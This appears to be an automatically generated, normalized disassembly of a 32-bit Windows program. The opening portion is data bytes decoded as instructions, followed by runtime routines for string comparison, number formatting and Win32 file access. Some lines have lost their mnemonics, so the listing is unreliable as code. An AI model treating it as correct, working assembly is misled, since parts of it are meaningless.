add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax + eax * 2 ] bh
or al 0x0
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 2 + 0x40 ] ah
add [ eax + eax ] cl
add [ eax ] al
int3
outsd
insb
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x7b
inc eax
add [ eax ] dl
insb
nop
push esp
jpo r-xdata
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
outsd
jb r-xdata
sbb al 0x33
add [ eax ] al
add [ eax + 0x75 ] ch
inc eax
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ ecx ] cl
inc ebp
inc ebx
outsd
outsb
je r-xdata
mov al 0x7b
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1000407b ] dh
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ esi ] cl
inc ebp
push ebx
je r-xdata
add [ ebx + esi ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
rcr [ edx + edi * 2 + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_407ca3
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ esi ] cl
outsd
jb r-xdata
arpl [ ebp + eax * 2 + 0x72 ] si
jb r-xdata
inc ebp
inc ecx
bound esi [ ebx + 0x74 ]
jb r-xdata
pop eax
xor eax [ eax ]
push cs
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edi * 2 + 0x40 ] bh
add [ eax ] dl
add [ eax ] al
add ah cl
jae r-xdata
jb r-xdata
add ah cl
jae r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax ] cl
inc ebp
dec edi
push ebx
inc ebp
jb r-xdata
adc [ ebp + 0x41 ] al
jae r-xdata
and [ ebp + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
jge r-xdata
add [ eax ] al
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
add [ ecx ] dl
add ebp [ esi ]
aaa
xor al 0x4
add [ eax ] al
add [ eax + edx + sub_480040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
add [ eax + eax ] cl
add [ eax ] al
int3
xchg esp eax
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax + edx + 0x53080040 ] dl
jns r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
int3
mov al [ 0x4035 ]
push ebp
xor eax [ eax ]
sbb al 0x33
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax - 0x67ffbff0 ] dh
add [ eax + 0x4400407e ] cl
add [ eax ] al
je r-xdata
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ esi ] cl
inc ebp
dec ecx
outsb
je r-xdata
inc eax
add ah dl
jge r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ebp + 0x40 ] bh
imul ebp [ edi + 0x6e ] 0x6c696146
lea eax [ eax ]
les edi [ eax + eax * 2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les edi [ eax + eax * 2 ]
or al 0x0
add [ eax ] al
int3
loopne r-xdata
je r-xdata
xor eax 0x35ac0040
inc eax
add [ eax + 0x4035 ] ah
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
mov [ esi + 0x40 ] bh
add [ eax + eax ] al
imul ebp [ edi + 0x6e ] 0x407dec90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
popad
jae r-xdata
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edx ] dl
inc ebp
push ebx
popad
arpl [ gs : ecx + 0x6c ] sp
insb
inc ebp
js r-xdata
add [ ebx + esi ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407edc3f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
jg r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcl [ eax ] 0x7e
inc eax
add [ ecx ] dl
add ebp [ esi ]
cmp [ esp + eax ] dh
add [ eax ] al
add [ eax + edx + sub_480040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x7d
inc eax
inc ebp
jb r-xdata
xor ecx ecx
outsb
imul edi [ edx + 0x65 ] r-xdata
add [ ebx + esi ] bl
inc eax
add al bh
jle r-xdata
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
add eax 0xffffffd4
jmp sub_40d3bc
inc eax
add [ eax + 0x130040d0 ] ah
push esp
push esp
push 0x64616572
dec esp
outsd
arpl [ ecx + 0x6c ] sp
add [ ebx + esi ] bl
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
jge r-xdata
pop ebx
cmp al 0x0
add al ch
mov ebx 0x5e5fffff
je r-xdata
add [ edx + edx * 8 + 0x40 ] al
add [ esp + edx * 2 ] ah
dec ebp
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi * 2 + 0x40 ] ah
add [ eax ] dh
add [ eax ] al
add [ ecx + edx + 0x35980040 ] ah
inc eax
add [ ebx + ebx * 2 + 0x5b900040 ] al
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax + 0x1c00405b ] ah
xor eax [ eax ]
inc esp
rol [ eax ] cl
and al 0x54
inc ebx
outsd
jne r-xdata
insb
jae r-xdata
pop ebx
retn
call sub_40bc34
call sub_403b1c
pop edi
pop esi
push edx
popad
inc ebp
js r-xdata
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
sar bh 0xff
insb
jne r-xdata
mov eax ebx
call sub_4026ec
mov esi eax
mov eax esi
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
mov edx ebx
call sub_402d24
mov eax esi
pop esi
pop ebx
retn
dec [ ebx + 0x33c68bf0 ]
leave
arpl [ eax + 0x72 ] bp
outsd
sub_407f8c
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407fc0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc34
call sub_403b1c
pop edi
pop esi
pop ebx
retn
sub_407fe4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4026ec
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402d24
mov eax esi
pop esi
pop ebx
retn
sub_408004
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_40270c
call ebx
pop ebx
retn
sub_408030
push ebx
mov ebx eax
mov eax 0xc
call sub_4026ec
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_408004
pop ebx
retn
sub_408068
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404424
mov ebx eax
mov eax edi
mov edx ebx
call sub_4047b0
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_4080a4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404424
mov ebx eax
mov eax edi
mov edx ebx
call sub_4047b0
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_4080e0
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_408110
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_408130
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_408184
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_408130
test eax eax
jne r-xdata
sub_4081a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404424
push eax
mov eax esi
call sub_404624
push eax
mov eax ebx
call sub_404424
push eax
mov eax ebx
call sub_404624
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_4081e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404424
push eax
mov eax esi
call sub_404624
push eax
mov eax ebx
call sub_404424
push eax
mov eax ebx
call sub_404624
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_408230
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_408250
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_404424
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_404164
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_404684
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4082a0
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_404424
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_404424
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_408304
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_40831a
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_40831a
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_40831a
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408350
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_408304
mov edx esi
pop eax
call sub_404254
add esp 0x10
pop esi
retn
sub_408370
or cl cl
jne sub_4083a4
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_4083a4
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_4083a4
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_4083a4
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_40843c
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_408370
mov edx esi
pop eax
call sub_404254
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_408464
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_408304
mov edx esi
pop eax
call sub_404254
add esp 0x20
pop esi
retn
xor edx edx
sub_40848c
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402d44
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407fc0
sub_4084e0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402d44
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408500
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_405054
mov [ esi ] eax
mov [ esi + 0x4 ] edx
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408520
mov eax [ rw-data ]
call sub_405284
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_405284
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405440
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_4041b8
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405440
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_4041b8
sub_4085b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_408218
test al al
je r-xdata
sub_4085ec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_409824
mov edx eax
test dl dl
je r-xdata
call sub_408520
push ebp
mov eax [ rw-data ]
call sub_40528c
mov edx eax
mov eax [ rw-data ]
call sub_4085b0
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_40528c
mov edx eax
mov eax [ rw-data ]
call sub_4085b0
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_408688
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4041b8
call sub_408520
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_4041b8
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_4041b8
jmp r-xdata
pop esi
pop ebx
retn
sub_4086d4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_404624
push eax
call CreateFileA
sub_40872c
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_404624
push eax
call CreateFileA
pop ebx
retn
sub_408758
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408784
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4087b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4087f0
push ebp
mov ebp esp
add esp 0xfffffeb4
push ebx
mov ebx eax
lea eax [ ebp - 0x14c ]
push eax
mov eax ebx
call sub_404624
push eax
call FindFirstFileA
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
call FindClose
test [ ebp - 0x14c ] 0x10
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x138 ]
push eax
call FileTimeToLocalFileTime
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call FileTimeToDosDateTime
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_408868
push ebx
push esi
mov esi eax
mov eax esi
call sub_404424
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40c4f0
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_408898
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_404424
mov edi eax
mov eax ebx
call sub_404624
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_408b54
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40c4f0
cmp al 0x2
jne r-xdata
dec edi
sub_4088e8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_408898
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_404684
pop edi
pop esi
pop ebx
retn
sub_408920
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_404624
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_404254
add esp 0x108
pop esi
pop ebx
retn
sub_40895c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_405030
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_405030
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_408a0c
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_408a34
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_408a68
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_404424
push eax
mov eax ebx
call sub_404624
mov edx eax
mov eax esi
pop ecx
call sub_408a34
pop esi
pop ebx
retn
sub_408a8c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_404624
mov edx eax
mov ecx edi
mov eax ebx
call sub_408a34
pop edi
pop esi
pop ebx
retn
sub_408aac
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_408ad0
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408b10
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408b68
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_408bdc
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_4089d0
mov esi eax
inc esi
mov eax esi
call sub_408bbc
mov ecx esi
mov edx ebx
call sub_4089fc
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_408c18
push ebx
push esi
push edi
